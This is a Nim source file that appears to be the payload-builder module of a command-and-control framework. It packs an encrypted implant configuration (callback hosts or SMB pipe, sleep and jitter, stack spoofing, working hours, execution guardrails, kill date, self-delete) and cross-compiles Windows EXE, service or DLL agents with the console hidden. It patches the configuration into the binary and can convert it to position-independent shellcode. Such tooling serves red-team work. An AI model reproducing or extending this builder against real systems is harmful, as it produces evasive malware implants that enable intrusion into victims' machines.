import terminal, strformat, strutils, tables, system, osproc, streams, os
import std/enumutils

import ../globals
import ../core/[logger, websocket]
import ../db/database 
import ../../common/[utils, serialize, crypto]
import ../../types/[common, server]

const PLACEHOLDER = "PLACEHOLDER"

proc serializeConfiguration(cq: Conquest, agentBuildInformation: AgentBuildInformation, listener: Listener, clientId: string = ""): seq[byte] = 
    var packer = Packer.init()

    # Add listener configuration
    # Variable length data is prefixed with a 4-byte length indicator

    # Listener configuration
    packer.add(string.toUuid(listener.listenerId))

    # Callback settings 
    case listener.listenerType:
    of LISTENER_HTTP:
        packer.addDataWithLengthPrefix(string.toBytes(listener.hosts))
        packer.addDataWithLengthPrefix(string.toBytes(listener.profile))
    of LISTENER_SMB: 
        packer.addDataWithLengthPrefix(string.toBytes(listener.pipe))
        packer.addDataWithLengthPrefix(string.toBytes(""))

    # Sleep settings
    packer.add(agentBuildInformation.sleepSettings.sleepDelay)
    packer.add(agentBuildInformation.sleepSettings.jitter)
    packer.add(uint8(agentBuildInformation.sleepSettings.sleepTechnique))
    packer.add(uint8(agentBuildInformation.sleepSettings.spoofStack))
    
    # Working hours
    packer.add(uint8(agentBuildInformation.sleepSettings.workingHours.enabled))
    packer.add(uint32(agentBuildInformation.sleepSettings.workingHours.startHour))
    packer.add(uint32(agentBuildInformation.sleepSettings.workingHours.startMinute))
    packer.add(uint32(agentBuildInformation.sleepSettings.workingHours.endHour))
    packer.add(uint32(agentBuildInformation.sleepSettings.workingHours.endMinute))

    # Execution guardrails
    packer.add(agentBuildInformation.guardrails.guardrails)
    packer.addDataWithLengthPrefix(string.toBytes(agentBuildInformation.guardrails.domain))
    packer.addDataWithLengthPrefix(string.toBytes(agentBuildInformation.guardrails.ip))
    packer.addDataWithLengthPrefix(string.toBytes(agentBuildInformation.guardrails.hostname))

    # Kill date
    packer.add(uint64(agentBuildInformation.killDate))

    # Self-delete 
    packer.add(uint8(agentBuildInformation.selfDelete))

    # Public key for key exchange
    packer.addData(cq.keyPair.publicKey)

    let data = packer.pack() 
    packer.reset() 

    # Encrypt profile configuration data with a newly generated encryption key
    var aesKey = generateBytes(Key) 
    let nonce = generateBytes(Nonce)

    let (encData, mac) = encrypt(aesKey, nonce, data)

    # Add plaintext encryption material in front of the 
    packer.addData(aesKey)
    packer.addData(nonce)
    packer.addData(mac)
    packer.add(uint32(encData.len()))
    let encMaterial = packer.pack() 

    wipeKey(aesKey)

    cq.info("Profile configuration serialized.")
    cq.sendBuildlogItem(LOG_INFO_SHORT, "Profile configuration serialized.", clientId = clientId)

    return encMaterial & encData 
    
proc compile(cq: Conquest, placeholderLength: int, agentBuildInformation: AgentBuildInformation, listener: Listener, clientId: string = ""): string = 
    # Build payload name 
    let listenerType = ($listener.listenerType)
    let agentType = ($agentBuildInformation.agentType).toLowerAscii() 
    let arch = $agentBuildInformation.arch 
    let (cpu, gcc) = case agentBuildInformation.arch
        of ARCH_X64: ("amd64", "x86_64-w64-mingw32-gcc")
        of ARCH_X86: ("i386", "i686-w64-mingw32-gcc")

    var ext: string = ""
    var additionalFlags: string = ""

    case agentBuildInformation.payloadType
    of PAYLOAD_EXE: ext = "exe"
    of PAYLOAD_SVC: ext = "svc.exe"
    of PAYLOAD_DLL, PAYLOAD_BIN:
        ext = "dll"
        additionalFlags = """
--app:lib
--nomain
--passL:"-static-libgcc -static-libstdc++ -Wl,-Bstatic -lpthread""""

    let configFile = fmt"{CONQUEST_ROOT}/src/agents/{agentType}/nim.cfg"  
    let outFile = fmt"{CONQUEST_ROOT}/bin/{agentType}.{listenerType.toLowerAscii()}_{arch}.{ext}" 

    # Allow environment variable to specify the location of the nimble dependencies. 
    # This is primarily used when the team server is running under a context that does not have the packages installed in the default location (~/.nimble/pkgs2)
    # Usage: NIMBLE_PATH=/path/to/vendor/pkgs2 bin/server -p profile.toml
    let nimblePath = getEnv("NIMBLE_PATH")
    let depsDir = if nimblePath != "": fmt"--nimblePath:{nimblePath}" else: ""
    let buildCommand = fmt"nim {depsDir} --os:windows --cpu:{cpu} --gcc.exe:{gcc} --gcc.linkerexe:{gcc} -o:{outFile} c {CONQUEST_ROOT}/src/agents/{agentType}/main.nim"
    
    # Create agent configuration file (nim.cfg)  
    let placeholder = PLACEHOLDER & "A".repeat(placeholderLength - len(PLACEHOLDER))
    let hideConsole = if not agentBuildInformation.verbose: ",-subsystem,windows" else: ""
    let payloadType = if agentBuildInformation.payloadType == PAYLOAD_BIN: symbolName(PAYLOAD_DLL) else: symbolName(agentBuildInformation.payloadType) # Shellcode payload is first compiled as a DLL
    var config = fmt"""# Compiler flags
-d:agent
-d:release
--opt:size
--l:"-Wl,-s{hideConsole}"
{additionalFlags}
# Monarch agent configuration
-d:CONFIGURATION="{placeholder}"
-d:MODULES={$agentBuildInformation.modules}
-d:VERBOSE={$agentBuildInformation.verbose}
-d:TRANSPORT_{listenerType}
-d:{payloadType}""" 

    writeFile(configFile, config)

    cq.info(fmt"Placeholder created ({placeholder.len()} bytes).")
    cq.sendBuildlogItem(LOG_INFO_SHORT, fmt"Placeholder created ({placeholder.len()} bytes).", clientId = clientId)
    
    # Build agent by executing the ./build.sh script on the system.
    cq.info("Compiling agent.")
    cq.sendBuildlogItem(LOG_INFO_SHORT, "Compiling agent...", clientId = clientId)
    
    try:
        # Using the startProcess function from the 'osproc' module, it is possible to retrieve the output as it is recenonceed, line-by-line instead of all at once
        let process = startProcess("/bin/bash", args=["-c", buildCommand], options={poUsePath, poStdErrToStdOut})
        let outputStream = process.outputStream

        var line: string
        while outputStream.readLine(line):
            cq.output(line) 

        let exitCode = process.waitForExit()

        # Check if the build succeeded or not
        if exitCode == 0:
            cq.info("Agent payload generated successfully.")
            cq.sendBuildlogItem(LOG_INFO_SHORT, "Agent payload generated successfully.", clientId = clientId)
            return outFile
        else:
            cq.error("Build script exited with code ", $exitCode)
            cq.sendBuildlogItem(LOG_ERROR_SHORT, "Build script exited with code " & $exitCode, clientId = clientId)
            return ""

    except CatchableError as err:
        cq.error("An error occurred: ", err.msg)
        return ""
    
proc patch(cq: Conquest, path: string, configuration: seq[byte], clientId: string = ""): seq[byte] = 
    cq.info("Patching profile configuration into agent.")
    cq.sendBuildlogItem(LOG_INFO_SHORT, "Patching profile configuration into agent.", clientId = clientId)

    try: 
        var bytes = readFile(path) 

        # Find placeholder 
        let placeholderPos = bytes.find(PLACEHOLDER) 
        if placeholderPos == -1: 
            raise newException(CatchableError, "Placeholder not found.")
        
        cq.info(fmt"Placeholder found at offset 0x{placeholderPos:08X}.")
        cq.sendBuildlogItem(LOG_INFO_SHORT, fmt"Placeholder found at offset 0x{placeholderPos:08X}.", clientId = clientId)

        # Patch placeholder bytes
        for i, c in Bytes.toString(configuration): 
            bytes[placeholderPos + i] = c 

        writeFile(path, bytes)

        cq.success(fmt"Agent payload patched successfully: {path}.")
        cq.sendBuildlogItem(LOG_SUCCESS_SHORT, fmt"Agent payload patched successfully: {path}.", clientId = clientId)
        return string.toBytes(bytes)
    
    except CatchableError as err:
        cq.error("An error occurred: ", err.msg) 
        cq.sendBuildlogItem(LOG_ERROR_SHORT, "An error occurred: " & err.msg, clientId = clientId)
        
    return @[]

# Agent generation 
proc agentBuild*(cq: Conquest, agentBuildInformation: AgentBuildInformation, clientId: string = ""): tuple[name: string, payload: seq[byte]] =
    # Verify that listener exists
    if not cq.dbListenerExists(agentBuildInformation.listenerId): 
        cq.error(fmt"Listener {agentBuildInformation.listenerId} does not exist.")
        return
    
    let listener = cq.listeners[agentBuildInformation.listenerId]
    var config = cq.serializeConfiguration(agentBuildInformation, listener, clientId)
    
    var path = cq.compile(config.len(), agentBuildInformation, listener, clientId)
    if path.isEmptyOrWhitespace():
        return 

    var patched = cq.patch(path, config, clientId)

    # Generate shellcode payload using Crystal Palace
    if agentBuildInformation.payloadType == PAYLOAD_BIN:
        cq.sendBuildlogItem(LOG_INFO_SHORT, "Creating position-independent shellcode.", clientId = clientId)

        let spec = fmt"{CONQUEST_ROOT}/data/tools/tcg/loaders/{agentBuildInformation.loader}/loader.spec"
        let binPath = path.changeFileExt("bin")
        let cmd = fmt"{CONQUEST_ROOT}/data/tools/tcg/cpl link {spec} {path} {binPath}"

        try:
            let process = startProcess("/bin/bash", args=["-c", cmd], options={poUsePath, poStdErrToStdOut})
            let outputStream = process.outputStream

            var line: string
            while outputStream.readLine(line):
                cq.output(line)

            let exitCode = process.waitForExit()
            if exitCode != 0:
                cq.error("Crystal Palace linking failed with code ", $exitCode)
                cq.sendBuildlogItem(LOG_ERROR_SHORT, "Crystal Palace linking failed with code " & $exitCode, clientId = clientId)
                return

            patched = string.toBytes(readFile(binPath))
            path = binPath
            cq.sendBuildlogItem(LOG_SUCCESS_SHORT, "Shellcode generated successfully.", clientId = clientId)

        except CatchableError as err:
            cq.error("Crystal Palace linking failed: ", err.msg)
            cq.sendBuildlogItem(LOG_ERROR_SHORT, "Crystal Palace linking failed: " & err.msg, clientId = clientId)
            return

    # Return packet to send to client
    return (path.extractFilename(), patched)